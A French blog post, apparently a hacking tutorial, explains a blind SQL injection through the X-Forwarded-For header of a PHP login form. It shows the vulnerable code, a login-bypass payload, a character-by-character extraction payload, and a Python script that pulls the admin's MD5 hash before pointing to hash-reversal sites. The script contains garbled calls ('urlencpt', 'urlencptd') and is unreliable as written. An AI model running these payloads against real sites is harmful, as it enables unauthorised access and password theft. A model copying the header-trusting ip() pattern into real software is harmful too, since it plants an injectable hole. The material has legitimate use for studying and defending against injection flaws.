---
layout: post
title: Blind SQL injection via un header HTTP
description: Cet article présente une façon originale d'exploiter une faille de type injection SQL.
categories: articles
tags: [hacking]
photo: sqli_http_header.png
comments: true
---

Cet article présente une façon originale d'exploiter une faille de type injection SQL. La faille se trouve dans un formulaire d'identification et plus précisément dans le code PHP qui ne contrôle pas tous les paramètres de la requête SQL.

Le code PHP est le suivant :

{% highlight php %}
<?php
$req = mysql_query("SELECT login,pwd FROM administrators
                    WHERE login='".sanitize($_POST['login'])."'
                    AND pwd='".md5($_POST['password'])."'
                    AND ip='".ip()."'");
?>
{% endhighlight %}

La variable login est correctement contrôlée grâce à la fonction _sanitize()_ :

{% highlight php %}
<?php
function sanitize($param){
    if (is_numeric($param)){
    	return $param;
	}
	else{
		return mysql_real_escape_string($param);
	}
}
?>
{% endhighlight %}

Et le mot de pass est directement converti en MD5, rien à faire de ce coté là. Intéressons nous au paramète "IP" et plus particulièrement à la fonction ip()_.

{% highlight php %}
<?php
function ip(){
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
	else{
		$ip = $_SERVER["REMOTE_ADDR"];
    }

	if (preg_match("#^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}#",$ip)){
		return $ip;
	}
	else{
		return $_SERVER["REMOTE_ADDR"];
	}
}
{% endhighlight %}

On remarque que la récupération de l'adresse ip repose sur un header HTTP _X_FORWARDED_FOR_ et que le seul contrôle effectué est un _preg_match_ qui permet de vérifier que le paramètre contient bien au moins une adresse ip. Il est alors possible d'injecter du code SQL dans le header HTTP afin de bypasser l'identification voir même d'extraire les informations de la BDD.

En modifiant le header par :

    127.0.0.1' or 1=1#

La requête est forcément vraie et on se retrouve identifié \o/

De la même manière on va pouvoir récupérer le password de l'administrateur, en effet lorsque la requete est fausse la page affiche "Mot de passe incorrect", en effectuant une [blind SQL injection](http://www.ghostsinthestack.org/article-11-blind-sql-injections.html) il est possible de retrouver le mot de passe caractère par caractère, exemple :

    127.0.0.1' or ascii(substring(pwd,1,1))=48#

Si la requête est vraie et donc que l'on se retrouve identifié alors cela veut dire que le premier caractère du mot de passe est "0" (48 en ascii)

J'ai écrit un petit script en python (mon premier) qui permet d'automatiser tout cela :

{% highlight python %}
import httplib
import urllib
import re

password = ""

md5 = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']
cpt = 0
i = 1

while i<=32:

	print 'Recherche du caractère '+str(i)
	if cpt == 16:
		cpt = 0

	print 'Test caractere : '+md5[cpt]
	params = urllib.urlencpt({'login': 'admin', 'pwd': 'password'})
	headers = {"Content-type": "application/x-www-form-urlencptd",
               "Accept": "text/plain",
               "x-forwarded-for":"127.0.0.1' or ascii(substring(pwd,"+str(i)+",1))="+str(ord(md5[cpt]))+"#"}
	conn = httplib.HTTPConnection("www.site.com:80")
	conn.request("POST", "/index.php", params, headers)
	response = conn.getresponse()
	print response.status, response.reason
	data = response.read()
	conn.close()

	if not(re.search('incorrect',data)):
		print 'Caractère trouvé : '+md5[cpt]
		password += md5[cpt]
		i += 1
		cpt = 0
	else:
		cpt += 1

print 'MD5 = '+str(password)
{% endhighlight %}

Et voila on trouve le hash et un passage par [cmd5.org](http://www.cmd5.org/) ou par [md5decrypter.co.uk](http://www.md5decrypter.co.uk/) nous donne la correspondance. Si vous avez des questions, commentaires n'hésitez pas.